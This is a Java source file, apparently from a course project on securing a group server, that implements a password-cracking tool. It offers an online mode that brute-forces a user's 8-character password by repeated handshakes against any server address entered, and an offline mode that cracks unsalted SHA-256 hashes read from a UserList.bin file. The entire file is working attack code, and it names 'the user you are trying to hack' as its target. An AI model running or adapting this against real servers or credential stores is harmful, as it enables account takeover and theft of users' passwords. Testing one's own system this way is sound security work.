/**
 * Exploit for attacking user passwords, either online or offline
 *
 * Usage: java PasswordAttack -offline
 * Usage: java PasswordAttack -online
 *
 * Online Attack of Brute Forcing User PasswordAttack
 * Usage: java PasswordAttack -online
 * Attacks the group server by brute forcing user passwords.
 * User password will be guessed online until correct password is found
 *
 * Offline Attack of UserList.bin
 * Attacks unencrypted UserList.bin file from GroupServer.
 * If the user exists, the user's password is attained through
 * a brute force search. 
 *
 * Since this is a brute force attack, the program can take long to
 * run. For testing purposes, you can decrease number of characters
 * in allChar array - you would also need to decrease the number of characters
 * in allChar array in the UserList.java class as well.
 */
 
import java.io.*;
import java.util.*;
import java.security.MessageDigest;
import java.lang.Exception;
import org.bouncycastle.jce.provider.BouncyCastleProvider;
import java.security.Security;
import java.security.Provider;

public class PasswordAttack {
  public static void main(String[] args) throws Exception {
      if (args[0].equals("-offline")) {
        System.out.println("Offline password attack:");
        String password = offline();
        if (password != null) {
          System.out.println("User password found! Their password is: " + password);
        }
        else {
          System.out.println("User password could not be found");
        }
      }
      else if (args[0].equals("-online")) {
        System.out.println("Online password attack:");
        String password = online();
        if (password != null) {
          System.out.println("User password found! Their password is: " + password);
        }
        else {
          System.out.println("User password could not be found");
        }
      }
      else {
        System.out.println("Usage:");
        System.out.println("java PasswordAttack -online");
        System.out.println("java PasswordAttack -offline");
      }
  }
  
  public static String online() throws Exception {
    Scanner console = new Scanner(System.in);
    
    System.out.println("Please enter the Group Server information.");
		System.out.print("Address: ");
		String serverName = console.next();
		System.out.print("Port: ");
		int port = Integer.parseInt(console.next());
    System.out.print("Username: ");
    String username = console.next();
    
    //generate new user password. password will be of length 8
    char[] allChar = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".toCharArray();
    
    //let's generate our random Strings to find the password
    boolean found = false;
    String hackedPassword = null;
    
    System.out.println("Brute force seach of password is now beginning, this may take awhile");
    char[] characters = new char[8];
    
    boolean success = false;
    for (int i = 0; i < allChar.length; i++) {
      characters[0] = allChar[i];
      for (int j = 0; j < allChar.length; j++) {
        characters[1] = allChar[j];
        for (int k = 0; k < allChar.length; k++) {
          characters[2] = allChar[k];
          for (int l = 0; l < allChar.length; l++) {
            characters[3] = allChar[l];
            for (int m = 0; m < allChar.length; m++) {
              characters[4] = allChar[m];
              for (int n = 0; n < allChar.length; n++) {
                characters[5] = allChar[n];
                for (int o = 0; o < allChar.length; o++) {
                  characters[6] = allChar[o];
                  for (int p = 0; p < allChar.length; p++) {
                    characters[7] = allChar[p];
                    String testString = new String(characters);
                    
                    //start new groupclient and attempt to connect to server
                    GroupClient groupClient = new GroupClient();
                		boolean serverSuccess = groupClient.connect(serverName, port);
                		if (!serverSuccess) {
                			System.out.println("Failed to connected to the Group Server.");
                			return null;
                		}
                    
                    success = groupClient.handshake(username, testString);
                    //if handshake is successful, we have successfully found the password
                		if (success) {
                      return testString;
                		}        
                  }
                }
              }
            }
          }
        }
      }      
    }
    return null;
  }
  
  public static String offline() throws Exception {
    String userFile = "UserList.bin";
		Scanner console = new Scanner(System.in);
		ObjectInputStream userStream;
    UserList userList = null;
    
    Provider bc = new BouncyCastleProvider();
    Security.addProvider(bc);

		//Open user file to get user list
		try
		{
			FileInputStream fis = new FileInputStream(userFile);
			userStream = new ObjectInputStream(fis);
			userList = (UserList)userStream.readObject();
		}
		catch(Exception e)
		{
			System.out.println("UserList file could not be opened");
      System.exit(1);
		}
    
    System.out.print("Enter the name of the user you are trying to hack: ");
    String user = console.next();
    byte[] correctPasswordHash = userList.getUserPassword(user);
    
    //generate new user password. password will be of length 8
    char[] allChar = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".toCharArray();
    
    //let's generate our random Strings to find the password
    boolean found = false;
    String hackedPassword = null;
    
    System.out.println("Brute force seach of password is now beginning, this may take awhile");
    outer:
    while(!found) {
      char[] characters = new char[8];
      
      for (int i = 0; i < allChar.length; i++) {
        characters[0] = allChar[i];
        for (int j = 0; j < allChar.length; j++) {
          characters[1] = allChar[j];
          for (int k = 0; k < allChar.length; k++) {
            characters[2] = allChar[k];
            for (int l = 0; l < allChar.length; l++) {
              characters[3] = allChar[l];
              for (int m = 0; m < allChar.length; m++) {
                characters[4] = allChar[m];
                for (int n = 0; n < allChar.length; n++) {
                  characters[5] = allChar[n];
                  for (int o = 0; o < allChar.length; o++) {
                    characters[6] = allChar[o];
                    for (int p = 0; p < allChar.length; p++) {
                      characters[7] = allChar[p];
                      String testString = new String(characters);
                      
                      byte[] passwordHash = null;
                      MessageDigest hash = MessageDigest.getInstance("SHA-256", "BC");
                      passwordHash = hash.digest(testString.getBytes("UTF-8"));
                      if (Arrays.equals(passwordHash, correctPasswordHash)) {
                        hackedPassword = testString;
                        break outer;
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    
    return hackedPassword;
  }
}